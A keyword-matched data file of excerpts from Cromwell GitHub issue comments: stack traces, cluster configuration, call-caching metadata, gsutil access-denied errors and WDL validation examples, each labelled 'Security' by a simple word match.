re",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:3419,validat,validate,3419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['validat'],['validate']
Security,cala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.URLClassLoader.fin,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4085,Hash,HashMap,4085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,"cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1311,access,access,1311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,ception: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8101,secur,security,8101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"cess by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:255); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:251); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:62); 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:3592,Validat,Validated,3592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,3,"['Validat', 'validat']","['Validated', 'validateRunArguments']"
Security,"cket"": ""gs://broad-dsde-methods/cromwell-execution-30"",; ""zone"": ""us-east1-d"",; ""instanceName"": ""ggp-10276417784841300252""; },; ""outputs"": {; ""outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 1 LOCAL"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""cpu"": ""4"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-a,us-central1-b,us-east1-d,us-central1-c,us-central1-f,us-east1-c"",; ""memory"": ""16 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""727DC68A78243A55A510496DBD51C8FD"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File outBam"": ""51E81723BF4AE3737FA7A05AD3C404E0""; },; ""input count"": ""A87FF679A2F3E71D9181A67B7542122C"",; ""backend name"": ""5BAA79C7C5A573C899A61D342AA00484"",; ""command template"": ""7F303905B5A7C3C5E133EEA5D655F93F"",; ""input"": {; ""String docker"": ""5FFD9AB91DECDD52945847CAED219F0A"",; ""String outputName"": ""A3830295D56B220883B7627EB49D6ECD"",; ""String sortOrder"": ""33D645FB17F6C04818DAB3100252CF39"",; ""File bam"": ""v+At8g==""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; },; ""inputs"": {; ""outputName"": ""md.sorted"",; ""bam"": ""gs://broad-public-datasets/NA12878/NA12878.hg38.aligned.unsorted.duplicates_marked.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""sortOrder"": ""queryname""; },; ""backendLabels"": {; ""wdl-task-name"": ""sortsam"",; ""wdl-call-alias"": ""presort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e""; },; ""returnCode"": 0,; ""labels"": {; ""wdl-call-alias"": ""PreSort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-tas",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:6856,hash,hashes,6856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['hash'],['hashes']
Security,commit hash has our cromwell was running on - 192ea6025613df967d60e9e975693144035379d7,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-266790899:7,hash,hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-266790899,1,['hash'],['hash']
Security,"cp`, as @aednichols suggested (in my case Cromwell runs with service account `30148356615-compute@developer.gserviceaccount.com`):; ```; $ gcloud config set account giulio@broadinstitute.org; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; * giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/. Copying gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai...; / [1 files][143.2 KiB/143.2 KiB]; Operation completed over 1 objects/143.2 KiB.; $ gcloud config set account 30148356615-compute@developer.gserviceaccount.com; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; * 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/; AccessDeniedException: 403 30148356615-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```. So in this case the more appropriate questions would be:; 1) How do I get to have my service account `30148356615-compute@developer.gserviceaccount.com` have the same permissions as my personal account `giulio@broadinstitute.org`?; 2) How do I get Cromwell to run with my personal account `giulio@broadinstitute.org` instead of my service account?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782:1532,Access,AccessDeniedException,1532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782,2,"['Access', 'access']","['AccessDeniedException', 'access']"
Security,cromwell.jar:0.19]; 905173- at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; 905174- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; 905175- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; 905176- at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; 905177- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; 905178- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; 905179- at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; 905180- at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; 905181- at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; 905182- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; 905183- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; 905184- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905185- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905186- at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; 905187- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905188- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905189- at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(Trav,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:3856,hash,hash,3856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['hash'],['hash']
Security,cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:2517,hash,hash,2517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:2386,hash,hash,2386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,"d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workfl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1098,validat,validate,1098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,1,['validat'],['validate']
Security,edSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackendJobExecutionActor and JesInitializationActor. JobPreparationActor also triggers a similar stack t,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:1544,validat,validateCredentials,1544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validateCredentials']
Security,"ent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2715,access,access,2715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"esh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil 